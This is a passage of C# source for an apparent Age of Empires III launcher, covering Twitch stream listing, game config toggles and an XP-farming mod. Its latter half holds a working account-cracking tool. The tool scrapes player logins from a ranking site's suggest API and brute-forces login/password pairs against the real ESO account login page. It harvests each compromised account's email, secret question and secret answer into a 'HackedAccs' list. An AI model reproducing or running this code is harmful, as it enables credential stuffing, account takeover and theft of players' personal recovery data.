                bAdd.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                tbFriend.Focus();
            }
        }



        private void bFriends_Click(object sender, RoutedEventArgs e)
        {
            if (gFriends.Visibility == Visibility.Visible)
                gFriends.Visibility = Visibility.Collapsed;
            else
            {
                gStreams.Visibility = Visibility.Collapsed;
                gFriends.Visibility = Visibility.Visible;
            }
        }


        // STREAMS //
        //////////
        ///
        //

        public class Preview
        {
            public string small { get; set; }
            public string medium { get; set; }
            public string large { get; set; }
            public string template { get; set; }
        }

        public class Links
        {
            public string self { get; set; }
            public string follows { get; set; }
            public string commercial { get; set; }
            public string stream_key { get; set; }
            public string chat { get; set; }
            public string features { get; set; }
            public string subscriptions { get; set; }
            public string editors { get; set; }
            public string teams { get; set; }
            public string videos { get; set; }
        }

        public class Channel
        {
            public bool mature { get; set; }
            public bool partner { get; set; }
            public string status { get; set; }
            public string broadcaster_language { get; set; }
            public string display_name { get; set; }
            public string game { get; set; }
            public string language { get; set; }
            public int _id { get; set; }
            public string name { get; set; }
            public string created_at { get; set; }
            public string updated_at { get; set; }
            public object delay { get; set; }
            public string logo { get; set; }
            public object banner { get; set; }
            public string video_banner { get; set; }
            public object background { get; set; }
            public string profile_banner { get; set; }
            public string profile_banner_background_color { get; set; }
            public string url { get; set; }
            public int views { get; set; }
            public int followers { get; set; }
            public Links _links { get; set; }
        }

        public class Links2
        {
            public string self { get; set; }
        }

        public class Stream
        {
            public object _id { get; set; }
            public string game { get; set; }
            public int viewers { get; set; }
            public int video_height { get; set; }
            public double average_fps { get; set; }
            public int delay { get; set; }
            public string created_at { get; set; }
            public bool is_playlist { get; set; }
            public string stream_type { get; set; }
            public Preview preview { get; set; }
            public Channel channel { get; set; }
            public Links2 _links { get; set; }
        }

        public class Links3
        {
            public string self { get; set; }
            public string next { get; set; }
            public string featured { get; set; }
            public string summary { get; set; }
            public string followed { get; set; }
        }

        public class Twitch
        {
            public int _total { get; set; }
            public List<Stream> streams { get; set; }
            public Links3 _links { get; set; }
        }

        private ObservableCollection<StreamItem> FStreams = new ObservableCollection<StreamItem>();
        public ObservableCollection<StreamItem> Streams
        {
            get { return FStreams; }
            set
            {
                FStreams = value;
                NotifyPropertyChanged("Streams");
            }
        }

        public class StreamItem : INotifyPropertyChanged
        {
            public event PropertyChangedEventHandler PropertyChanged;

            public void NotifyPropertyChanged(string propName)
            {
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propName));

            }
            private string FName = "";
            private int FViewers = 0;
            private string FStatus = "";
            private int FFollowers = 0;
            private TimeSpan FLength;
            private string FURL;

            public string Name
            {
                get { return FName; }
                set
                {
                    if (FName != value)
                    {
                        FName = value;
                        NotifyPropertyChanged("Name");
                        NotifyPropertyChanged("Hint");
                    }
                }
            }

            public string URL
            {
                get { return FURL; }
                set
                {
                    if (FURL != value)
                    {
                        FURL = value;
                        NotifyPropertyChanged("URL");
                    }
                }
            }

            public string Status
            {
                get { return FStatus; }
                set
                {
                    if (FStatus != value)
                    {
                        FStatus = value;
                        NotifyPropertyChanged("Status");
                        NotifyPropertyChanged("Hint");
                    }
                }
            }

            public TimeSpan Length
            {
                get { return FLength; }
                set
                {
                    if (FLength != value)
                    {
                        FLength = value;
                        NotifyPropertyChanged("Length");
                        NotifyPropertyChanged("Hint");
                    }
                }
            }

            public int Viewers
            {
                get { return FViewers; }
                set
                {
                    if (FViewers != value)
                    {
                        FViewers = value;
                        NotifyPropertyChanged("Viewers");
                        NotifyPropertyChanged("Hint");
                    }
                }
            }

            public int Followers
            {
                get { return FFollowers; }
                set
                {
                    if (FFollowers != value)
                    {
                        FFollowers = value;
                        NotifyPropertyChanged("Followers");
                        NotifyPropertyChanged("Hint");
                    }
                }
            }

            public string Hint
            {
                get
                {
                    return Name + Environment.NewLine + "Status: " + Status + Environment.NewLine + "Followers: " + Followers.ToString() + Environment.NewLine + "Viewers: " + Viewers.ToString() + Environment.NewLine + "Length: " + Length.ToString(@"hh\:mm\:ss") + Environment.NewLine + Environment.NewLine + "Click to open in browser";
                }
            }

        }
        private DispatcherTimer StreamsTimer = new DispatcherTimer()
        {
            Interval = TimeSpan.FromMilliseconds(100)
        };



        private void StreamsTimer_Tick(object sender, EventArgs e)
        {
            StreamsTimer.Stop();
            StreamsTimer.Interval = TimeSpan.FromMilliseconds(30000);
            GetTwitchStreamsTAD();

        }

        async void GetTwitchStreamsTAD()
        {

            string Data = await HttpGetAsync("https://api.twitch.tv/kraken/streams/?game=" + WebUtility.UrlEncode("Age of Empires III: The Asian Dynasties") + "&live");
            try
            {
                Twitch root = JsonConvert.DeserializeObject<Twitch>(Data);
                ObservableCollection<StreamItem> streams = new ObservableCollection<StreamItem>();

                foreach (Stream S in root.streams)
                {
                    streams.Add(new StreamItem() { Name = S.channel.display_name, Followers = S.channel.followers, Viewers = S.viewers, Status = S.channel.status, Length = DateTime.Now - DateTime.Parse(S.created_at).ToLocalTime(), URL = S.channel.url });
                }


                /*   if (Streams.Count != 0)
                   {
                       var excludedIDs = new HashSet<string>(Streams.Select(p => p.Name));
                       var result = streams.Where(p => !excludedIDs.Contains(p.Name));
                       foreach (StreamItem f in result)
                       {
                           Notifications.Insert(0, new Notification { Owner = "Twitch Streams - Age of Empires III: The Asian Dynasties", Title = f.Name + " is online!", Date = DateTime.Now.ToString(), Icon = "pack://application:,,,/Launcher/twitch.png" });
                           NotifyPropertyChanged("NotificationCount");
                       }
                   }*/

                Streams = new ObservableCollection<StreamItem>(streams);
            }
            catch { }
            StreamsTimer.Start();
        }


        private void ListView3_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (listView3.SelectedItem != null)
                if (listView3.SelectedItem is StreamItem)
                    Process.Start((listView3.SelectedItem as StreamItem).URL);
        }






        private void bStreams_Click(object sender, RoutedEventArgs e)
        {
            if (gStreams.Visibility == Visibility.Visible)
                gStreams.Visibility = Visibility.Collapsed;
            else
            {
                gFriends.Visibility = Visibility.Collapsed;
                gStreams.Visibility = Visibility.Visible;
            }
        }

        private void mihidepopups_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            NotExist = S.IndexOf("hidepopups") == -1;
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.cfg"), true))
                            {
                                w.WriteLine("hidepopups");
                            }
                    }
                }
            }
            catch { }
        }

        private void mihidepopups_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            S.Remove("hidepopups");
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                }
            }
            catch { }
        }




        private void Image_MouseLeftButtonDown_5(object sender, RoutedEventArgs e)
        {
            Process.Start("Economic Calculator.exe");
        }



        private void TextBlock_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            Process.Start("http://aoe3.jpcommunity.com/rating2/player?n=" + (sender as TextBlock).Text);
        }

        private void Button_MouseLeftButtonDown(object sender, RoutedEventArgs e)
        {
            var path = GetPathForExe("{BE5FCEDA-3AE1-4A57-8C9D-D4C7713FA7F1}_is1");
            if (!string.IsNullOrEmpty(path))
            {
                var startInfo = new ProcessStartInfo();

                startInfo.WorkingDirectory = path;
                startInfo.FileName = Path.Combine(path, "ESO Tracker.exe");

                Process.Start(startInfo);

            }

        }






        private const string keyBase = @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\";
        private string GetPathForExe(string fileName)
        {
            RegistryKey localMachine = Registry.LocalMachine;
            RegistryKey fileKey = localMachine.OpenSubKey(string.Format(@"{0}\{1}", keyBase, fileName));
            object result = null;
            if (fileKey != null)
            {
                result = fileKey.GetValue("InstallLocation");
                fileKey.Close();
            }


            return (string)result;
        }

        private void MiFastESO_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.con")))
                        {
                            string M = File.ReadAllText(Path.Combine(P.ToString(), "Startup", "user.con"));
                            NotExist = !M.Contains("startRandomGame() modeEnter(\"Pregame\") doMPSetup(true)");
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.con"), true))
                            {
                                w.WriteLine("startRandomGame() modeEnter(\"Pregame\") doMPSetup(true)");
                            }
                    }
                }
            }
            catch { }
        }

        private void MiFastESO_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.con")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.con")).ToList();
                            S.RemoveAt(S.FindIndex(x => x.EndsWith("startRandomGame() modeEnter(\"Pregame\") doMPSetup(true)")));
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.con"), S.ToArray());
                        }
                }
            }
            catch { }
        }

        private void TbPLayer_KeyDown(object sender, KeyEventArgs e)
        {
            if (tbPlayer.Text != "" && e.Key == System.Windows.Input.Key.Enter)
            {
                bSearch.Focus();
                bSearch.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                bSearch.Focus();
            }
        }

        private void BSearch_Click(object sender, RoutedEventArgs e)
        {
            if (tbPlayer.Text != "")
                Process.Start("http://aoe3.jpcommunity.com/rating2/player?n=" + tbPlayer.Text);
        }

        private void Button_Click_10(object sender, RoutedEventArgs e)
        {

            Storyboard story = new Storyboard();
            story.FillBehavior = FillBehavior.HoldEnd;


            DiscreteStringKeyFrame discreteStringKeyFrame;
            StringAnimationUsingKeyFrames stringAnimationUsingKeyFrames = new StringAnimationUsingKeyFrames();
            stringAnimationUsingKeyFrames.Duration = new Duration(TimeSpan.FromMilliseconds(20000));
            stringAnimationUsingKeyFrames.BeginTime = TimeSpan.FromMilliseconds(500);
            string tmp = string.Empty;
            foreach (char c in (string)Application.Current.FindResource("Joke"))
            {
                discreteStringKeyFrame = new DiscreteStringKeyFrame();
                discreteStringKeyFrame.KeyTime = KeyTime.Paced;
                tmp += c;
                discreteStringKeyFrame.Value = tmp;
                stringAnimationUsingKeyFrames.KeyFrames.Add(discreteStringKeyFrame);
            }



            DiscreteStringKeyFrame discreteStringKeyFrame4 = new DiscreteStringKeyFrame(string.Empty);
            StringAnimationUsingKeyFrames stringAnimationUsingKeyFrames4 = new StringAnimationUsingKeyFrames();
            stringAnimationUsingKeyFrames4.Duration = new Duration(TimeSpan.FromMilliseconds(0));
            stringAnimationUsingKeyFrames4.BeginTime = TimeSpan.FromMilliseconds(0);
            stringAnimationUsingKeyFrames4.KeyFrames.Add(discreteStringKeyFrame4);
            Storyboard.SetTargetName(stringAnimationUsingKeyFrames4, tbHackJoke.Name);
            Storyboard.SetTargetProperty(stringAnimationUsingKeyFrames4, new PropertyPath(TextBlock.TextProperty));
            story.Children.Add(stringAnimationUsingKeyFrames4);




            DiscreteObjectKeyFrame discreteStringKeyFrame3 = new DiscreteObjectKeyFrame(Visibility.Visible);
            ObjectAnimationUsingKeyFrames stringAnimationUsingKeyFrames3 = new ObjectAnimationUsingKeyFrames();


            stringAnimationUsingKeyFrames3.BeginTime = TimeSpan.FromMilliseconds(0);
            stringAnimationUsingKeyFrames3.Duration = TimeSpan.FromMilliseconds(0);
            stringAnimationUsingKeyFrames3.KeyFrames.Add(discreteStringKeyFrame3);
            Storyboard.SetTargetName(stringAnimationUsingKeyFrames3, tbHackJoke.Name);
            Storyboard.SetTargetProperty(stringAnimationUsingKeyFrames3, new PropertyPath(TextBlock.VisibilityProperty));
            story.Children.Add(stringAnimationUsingKeyFrames3);



            Storyboard.SetTargetName(stringAnimationUsingKeyFrames, tbHackJoke.Name);
            Storyboard.SetTargetProperty(stringAnimationUsingKeyFrames, new PropertyPath(TextBlock.TextProperty));
            story.Children.Add(stringAnimationUsingKeyFrames);






            DiscreteObjectKeyFrame discreteStringKeyFrame2 = new DiscreteObjectKeyFrame(Visibility.Collapsed);
            ObjectAnimationUsingKeyFrames stringAnimationUsingKeyFrames2 = new ObjectAnimationUsingKeyFrames();

            stringAnimationUsingKeyFrames2.BeginTime = TimeSpan.FromMilliseconds(25000);
            stringAnimationUsingKeyFrames2.Duration = TimeSpan.FromMilliseconds(0);
            stringAnimationUsingKeyFrames2.KeyFrames.Add(discreteStringKeyFrame2);
            Storyboard.SetTargetName(stringAnimationUsingKeyFrames2, tbHackJoke.Name);
            Storyboard.SetTargetProperty(stringAnimationUsingKeyFrames2, new PropertyPath(TextBlock.VisibilityProperty));
            story.Children.Add(stringAnimationUsingKeyFrames2);

            story.Begin(tbHackJoke);
        }

        private async void Image_MouseLeftButtonDown_6(object sender, MouseButtonEventArgs e)
        {
            iXP.Visibility = Visibility.Collapsed;
            gXP.Visibility = Visibility.Visible;
            window.IsEnabled = false;
            var newVer = await GetNewVersion();
            var curVer = Paths.GetEPVersion();
            if (newVer.Item1 != null && curVer != null && curVer != newVer.Item1)
            {
                var ESOCPatchLauncher = Process.GetProcesses().
                     Where(pr => pr.ProcessName == "ESOCPatchLauncher");

                foreach (var process in ESOCPatchLauncher)
                {
                    process.Kill();
                }
                await InstallEPUpdates(newVer.Item2);
            }
            window.IsEnabled = true;
            iXP.Visibility = Visibility.Visible;
            gXP.Visibility = Visibility.Collapsed;





            MessageBox.Show((string)Application.Current.FindResource("This mod will level up your homecity by 100.") + Environment.NewLine + Environment.NewLine +
(string)Application.Current.FindResource("1. Find a partner with the same mod.") + Environment.NewLine +
(string)Application.Current.FindResource("2. Enable mod.") + Environment.NewLine +
(string)Application.Current.FindResource("3. Start the game.") + Environment.NewLine +
(string)Application.Current.FindResource("4. Play a game on fast mod.") + Environment.NewLine +
(string)Application.Current.FindResource("5. Wait 2 minutes and resign (the winner will receive the XP).") + Environment.NewLine +
(string)Application.Current.FindResource("6. Close the game.") + Environment.NewLine +
(string)Application.Current.FindResource("7. Disable mod.") + Environment.NewLine +
(string)Application.Current.FindResource("8. Done!"));
            Paths.OpenTAD("age3xpmod.exe");
        }

        private void RadioButton_Checked_1(object sender, RoutedEventArgs e)
        {
            gHotkeysEditor.Visibility = Visibility.Visible;
        }

        private void RadioButton_Unchecked_1(object sender, RoutedEventArgs e)
        {
            gHotkeysEditor.Visibility = Visibility.Collapsed;
        }

        private void BAdd1_Checked(object sender, RoutedEventArgs e)
        {
            gBuildingConstruction.Visibility = Visibility.Visible;
        }

        private void BAdd1_Unchecked(object sender, RoutedEventArgs e)
        {
            gBuildingConstruction.Visibility = Visibility.Collapsed;
        }

        private void RadioButton_Checked_7(object sender, RoutedEventArgs e)
        {
            gHackAccs.Visibility = Visibility.Visible;
        }

        private void RadioButton_Unchecked_3(object sender, RoutedEventArgs e)
        {
            gHackAccs.Visibility = Visibility.Collapsed;
        }

        private void RadioButton_Unchecked_4(object sender, RoutedEventArgs e)
        {
            gLogins.Visibility = Visibility.Collapsed;
        }

        private void RadioButton_Checked_8(object sender, RoutedEventArgs e)
        {
            gLogins.Visibility = Visibility.Visible;
        }











        ///////////////////////////////////////////////
        ///////////////////////////////////////////////
        ///////////////////////////////////////////////
        ///




        private string alpha { get; set; } = "qwertyuiopasdfghjklzxcvbnm_1234567890";
        public string Alpha
        {
            get { return alpha; }
            set
            {
                alpha = value;
                NotifyPropertyChanged("Alpha");

            }
        }


        private string firstAlpha { get; set; } = "a";
        public string FirstAlpha
        {
            get { return firstAlpha; }
            set
            {
                firstAlpha = value;
                NotifyPropertyChanged("FirstAlpha");
                NotifyPropertyChanged("MaxLoginsCount");
                NotifyPropertyChanged("LeftLoginsCount");
            }
        }



        CancellationTokenSource LoginsCancelTokenSource;
        CancellationToken LoginsToken;

        CancellationTokenSource HackedAccsCancelTokenSource;
        CancellationToken HackedAccsToken;

        private TimeSpan loginsTimeElapsed { get; set; }
        public string LoginsTimeElapsed
        {
            get { return loginsTimeElapsed.ToString("c"); }
        }

        public string LeftLoginsTime
        {
            get
            {
                if (scannedPackOfLoginsCount != 0)
                    return TimeSpan.FromTicks((long)(loginsTimeElapsed.Ticks * (MaxLoginsCount - 15 * scannedPackOfLoginsCount) / (15 * scannedPackOfLoginsCount))).ToString("c");
                else
                    return TimeSpan.FromSeconds(0).ToString("c");
            }
        }

        private int scannedPackOfLoginsCount;
        public string LeftLoginsCount
        {
            get
            {
                if (scannedPackOfLoginsCount == 0)
                    return MaxLoginsCount.ToString();
                else
                    return (MaxLoginsCount - 15 * scannedPackOfLoginsCount).ToString();
            }
        }

        public int CollectedLoginsCount
        {
            get { return CollectedLogins.Split('\n').Length; }

        }

        private int alphaDepth { get; set; }
        public int AlphaDepth
        {
            get { return alphaDepth; }
            set
            {
                alphaDepth = value;
                NotifyPropertyChanged("AlphaDepth");
                NotifyPropertyChanged("MaxLoginsCount");
                NotifyPropertyChanged("LeftLoginsCount");
            }
        }

        private int loginsWorkers { get; set; }
        public int LoginsWorkers
        {
            get { return loginsWorkers; }
            set
            {
                loginsWorkers = value;
                NotifyPropertyChanged("LoginsWorkers");

            }
        }

        public double MaxLoginsCount
        {
            get { return Math.Pow(Alpha.Length, AlphaDepth - 1) * 15 * firstAlpha.Length; }
        }


        private string collectedLogins { get; set; }
        public string CollectedLogins
        {
            get { return collectedLogins.TrimEnd(); }
            set
            {
                collectedLogins = value;
                NotifyPropertyChanged("CollectedLogins");
            }
        }

        private object LoginsLock = new object();



        private object HackedAccsLock = new object();

        private int hackedAccsWorkers { get; set; }
        public int HackedAccsWorkers
        {
            get { return hackedAccsWorkers; }
            set
            {
                hackedAccsWorkers = value;
                NotifyPropertyChanged("HackedAccsWorkers");

            }
        }



        private TimeSpan hackedAccsTimeElapsed { get; set; }
        public string HackedAccsTimeElapsed
        {
            get { return hackedAccsTimeElapsed.ToString("c"); }
        }

        public string LeftHackedAccsTime
        {
            get
            {
                if (scannedPairsCount != 0)
                    return TimeSpan.FromTicks((long)(hackedAccsTimeElapsed.Ticks * 1.0 * (MaxPairsCount - scannedPairsCount) / scannedPairsCount)).ToString(@"dd\:hh\:mm\:ss");
                else
                    return TimeSpan.FromSeconds(0).ToString("c");
            }
        }
        private int hackedAccsCount;
        public int HackedAccsCount
        {
            get { return hackedAccsCount; }
            set
            {
                hackedAccsCount = value;
                NotifyPropertyChanged("HackedAccsCount");

            }
        }

        private int scannedPairsCount;


        public string Scanned
        {
            get
            {
                if (MaxPairsCount == 0)
                    return scannedPairsCount.ToString();
                else

                    return scannedPairsCount.ToString() + " " + Math.Round(scannedPairsCount * 100.0 / MaxPairsCount, 2).ToString() + " %";
            }

        }

        private int MaxPairsCount { get; set; }
        public string LeftPairsCount
        {
            get
            {

                if (scannedPairsCount == 0)
                    return MaxPairsCount.ToString();
                else
                    return (MaxPairsCount - scannedPairsCount).ToString();
            }

        }






        async Task<string> HttpPostAsync(string Login, string Password)
        {
            try
            {
                HttpClient hc = new HttpClient();
                hc.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko)  Chrome/24.0.1312.57 Safari/537.17");
                hc.DefaultRequestHeaders.Accept.ParseAdd("text/html");
                hc.DefaultRequestHeaders.AcceptLanguage.ParseAdd("en-US");
                hc.DefaultRequestHeaders.AcceptCharset.ParseAdd("utf-8");

                var pairs = new List<KeyValuePair<string, string>>
                {
                new KeyValuePair<string, string>("__VIEWSTATE", "/wEPDwULLTE0NjE5Mjk1OTQPZBYCAgEPZBYIAgMPZBYGAgEPZBYCAgEPDxYCHgtOYXZpZ2F0ZVVybGVkZAIDDxYCHgdWaXNpYmxlaBYCAgEPDxYCHwFoZGQCBQ9kFgICAQ8PFgIfAGVkZAITDw8WAh4EVGV4dAUFTG9naW5kZAIXDw8WAh4MRXJyb3JNZXNzYWdlBRYqVXNlcm5hbWUgaXMgcmVxdWlyZWQuZGQCGQ8PFgIfAwUWKlBhc3N3b3JkIGlzIHJlcXVpcmVkLmRkZNuhU2qqHI/gUXLveVmso2HaT6U1"),
                new KeyValuePair<string, string>("__EVENTVALIDATION", "/wEdAAXjLpbnt7Eh/T7guB/koT/pxcn6oIDdbNQI5AQUIIyv4nY2+Mc6SrnAqio3oCKbxYZ100z73I0ej3E4zrB15fTLPOaW1pQztoQA36D1w/+bXSzsGGrhmMEr1m0g/eB0kQwHWXxz"),
                new KeyValuePair<string, string>("__VIEWSTATEGENERATOR", "C2EE9ABB"),
                new KeyValuePair<string, string>("txtLogin", Login),
                new KeyValuePair<string, string>("txtPassword", Password),
                new KeyValuePair<string, string>("btnSubmit","Login")
                };

                var content = new FormUrlEncodedContent(pairs);

                var result = await hc.PostAsync("https://esoaccounts.agecommunity.com/login.aspx?ReturnUrl=%2fAccountManagement%2fDefault.aspx", content);

                return await result.Content.ReadAsStringAsync();

            }
            catch
            {
                return "";
            }
        }



        async Task<string> HttpGetAsyncEx(string URI)
        {
            try
            {
                HttpClient hc = new HttpClient();
                hc.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko)  Chrome/24.0.1312.57 Safari/537.17");
                hc.DefaultRequestHeaders.Accept.ParseAdd("text/html");
                hc.DefaultRequestHeaders.AcceptLanguage.ParseAdd("en-US");
                hc.DefaultRequestHeaders.AcceptCharset.ParseAdd("utf-8");

                Task<System.IO.Stream> result = hc.GetStreamAsync(URI);

                System.IO.Stream vs = await result;
                using (StreamReader am = new StreamReader(vs, Encoding.UTF8))
                {
                    return await am.ReadToEndAsync();
                }
            }
            catch
            {
                return "";
            }
        }




        public IEnumerable<string> CombinationsWithRepition(IEnumerable<string> input, int length)
        {
            if (length <= 0)
                yield return "";
            else
            {
                foreach (var i in input)
                    foreach (var c in CombinationsWithRepition(Alpha.Select(c => c.ToString()), length - 1))
                        yield return i.ToString() + c;
            }
        }


        private List<string> GenerateLinksToSearchNames(int Level)
        {
            var urls = FirstAlpha.Select(c => c.ToString());
            var result = CombinationsWithRepition(urls, Level);

            return result.Select(c => { c = "http://aoe3.jpcommunity.com/rating2/api/suggest/player?q=" + WebUtility.UrlEncode(c); return c; }).ToList();
        }


        int LoginsState = 0;
        DispatcherTimer LoginsTimer = new DispatcherTimer();

        int HackedAccsState = 0;
        DispatcherTimer HackedAccsTimer = new DispatcherTimer();
        private async void Button_Click8(object sender, RoutedEventArgs e)
        {
            (sender as Button).IsEnabled = false;
            bLoginsPause.IsEnabled = false;
            bLoginsStop.IsEnabled = false;
            bLoginsRun.IsEnabled = false;
            LoginsState = 0;
            LoginsCancelTokenSource = new CancellationTokenSource();
            LoginsToken = LoginsCancelTokenSource.Token;
            tbDepth.IsReadOnly = true;
            tbAlpha.IsReadOnly = true;
            tbFirstAlpha.IsReadOnly = true;
            tbLoginsWorkers.IsReadOnly = true;
            tbScannedLogins.IsReadOnly = true;
            scannedPackOfLoginsCount = 0;
            loginsTimeElapsed = TimeSpan.FromSeconds(0);
            CollectedLogins = "";
            NotifyPropertyChanged("CollectedLoginsCount");
            NotifyPropertyChanged("CollectedLogins");
            NotifyPropertyChanged("LeftLoginsTime");
            NotifyPropertyChanged("LeftLoginsCount");
            LoginsTimer.Start();



            var urls = GenerateLinksToSearchNames(AlphaDepth);
            var maxThreads = LoginsWorkers;
            var q = new ConcurrentQueue<string>(urls);
            var tasks = new List<Task>();

            bLoginsPause.IsEnabled = true;
            bLoginsStop.IsEnabled = true;


            for (int n = 0; n < maxThreads; n++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (q.TryDequeue(out string url))
                    {
                        if (LoginsToken.IsCancellationRequested && LoginsState == 2)
                        {
                            return;
                        }
                        if (LoginsToken.IsCancellationRequested)
                        {
                            while (LoginsState == 1)
                                await Task.Delay(1000);
                        }
                        var names = await HttpGetAsyncEx(url);
                        //    var splitted = names.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                        lock (LoginsLock)
                        {
                            if (!string.IsNullOrEmpty(names))
                            {
                                collectedLogins += names;
                                NotifyPropertyChanged("CollectedLoginsCount");
                                NotifyPropertyChanged("CollectedLogins");
                            }
                        }
                        Interlocked.Increment(ref scannedPackOfLoginsCount);

                        NotifyPropertyChanged("LeftLoginsTime");
                        NotifyPropertyChanged("LeftLoginsCount");

                    }
                }));
            }
            await Task.WhenAll(tasks);
            File.WriteAllLines("Logins.txt", CollectedLogins.Split('\n'), Encoding.UTF8);
            tbHackedLogins.Text = CollectedLogins;
            LoginsTimer.Stop();
            tbDepth.IsReadOnly = false;
            tbAlpha.IsReadOnly = false;
            tbFirstAlpha.IsReadOnly = false;
            tbLoginsWorkers.IsReadOnly = false;
            tbScannedLogins.IsReadOnly = false;
            bLoginsPause.IsEnabled = false;
            bLoginsStop.IsEnabled = false;
            bLoginsRun.IsEnabled = false;
            (sender as Button).IsEnabled = true;
        }

        private void timer_Tick1(object sender, EventArgs e)
        {
            loginsTimeElapsed = loginsTimeElapsed.Add(TimeSpan.FromSeconds(1));
            NotifyPropertyChanged("LoginsTimeElapsed");
        }

        void timer_Tick2(object sender, EventArgs e)
        {
            hackedAccsTimeElapsed = hackedAccsTimeElapsed.Add(TimeSpan.FromSeconds(1));
            NotifyPropertyChanged("HackedAccsTimeElapsed");
            //     NotifyPropertyChanged("LeftPairs");

        }

        private ObservableCollection<PlayerInfo> hackedAccs = new ObservableCollection<PlayerInfo>();


        public ObservableCollection<PlayerInfo> HackedAccs
        {
            get { return hackedAccs; }
            set
            {
                hackedAccs = value;
                NotifyPropertyChanged("HackedAccs");
            }
        }
        private async void Button_Click_12(object sender, RoutedEventArgs e)
        {
            (sender as Button).IsEnabled = false;
            slPasswordsCount.IsEnabled = false;
            tbHackedLogins.IsReadOnly = true;
            tbHackedPasswords.IsReadOnly = true;
            hackedAccsTimeElapsed = TimeSpan.FromSeconds(0);



            bHackedAccsPause.IsEnabled = false;
            bHackedAccsStop.IsEnabled = false;
            bHackedAccsRun.IsEnabled = false;
            HackedAccsState = 0;
            HackedAccsCancelTokenSource = new CancellationTokenSource();
            HackedAccsToken = HackedAccsCancelTokenSource.Token;
            tbHackedAccsWorkers.IsReadOnly = true;


            hackedAccsCount = 0;
            scannedPairsCount = 0;
            HackedAccs.Clear();
            // BindingOperations.EnableCollectionSynchronization(HackedAccs, HackedAccsLock);
            //  NotifyPropertyChanged("HackedAccs");
            NotifyPropertyChanged("LeftHackedAccsTime");
            NotifyPropertyChanged("ScannedPairsCount");
            NotifyPropertyChanged("LeftPairsCount");
            NotifyPropertyChanged("Scanned");
            NotifyPropertyChanged("HackedAccsCount");



            HackedAccsTimer.Start();
            var logins = tbHackedLogins.Text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
            var passwords = tbHackedPasswords.Text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries).Take((int)slPasswordsCount.Value).ToArray();
            MaxPairsCount = logins.Length * passwords.Length;

            var loginsDictionary = new List<KeyValuePair<string, string>>();
            foreach (var password in passwords)
            {
                foreach (var login in logins)
                {
                    loginsDictionary.Add(new KeyValuePair<string, string>(login, password));
                }
            }


            var q = new ConcurrentQueue<KeyValuePair<string, string>>(loginsDictionary);
            var tasks = new List<Task>();
            var alreadyHacked = new Dictionary<string, PlayerInfo>();

            bHackedAccsPause.IsEnabled = true;
            bHackedAccsStop.IsEnabled = true;

            for (int n = 0; n < HackedAccsWorkers; n++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (q.TryDequeue(out KeyValuePair<string, string> pair))
                    {
                        if (HackedAccsToken.IsCancellationRequested && HackedAccsState == 2)
                        {
                            return;
                        }
                        if (HackedAccsToken.IsCancellationRequested)
                        {
                            while (HackedAccsState == 1)
                                await Task.Delay(1000);
                        }
                        if (!alreadyHacked.ContainsKey(pair.Key))
                        {
                            var result = await HttpPostAsync(pair.Key, pair.Value);
                            var html = new HtmlDocument();
                            html.LoadHtml(result);
                            if (html.GetElementbyId("txtEmail") != null)
                            {
                                lock (HackedAccsLock)
                                {
                                    alreadyHacked.Add(pair.Key, new PlayerInfo() { Login = pair.Key });
                                    HackedAccs.Add(new PlayerInfo() { Login = pair.Key, Password = pair.Value, Email = html.GetElementbyId("txtEmail").GetAttributeValue("value", null), SecretAnswer = html.GetElementbyId("txtSecretA").GetAttributeValue("value", null), SecretQuestion = html.GetElementbyId("txtSecretQ").GetAttributeValue("value", null), elo_link = "", pr_nilla = 0, lastLogin = "", pr_tad = 0, pr_tad_tr = 0 });
                                }
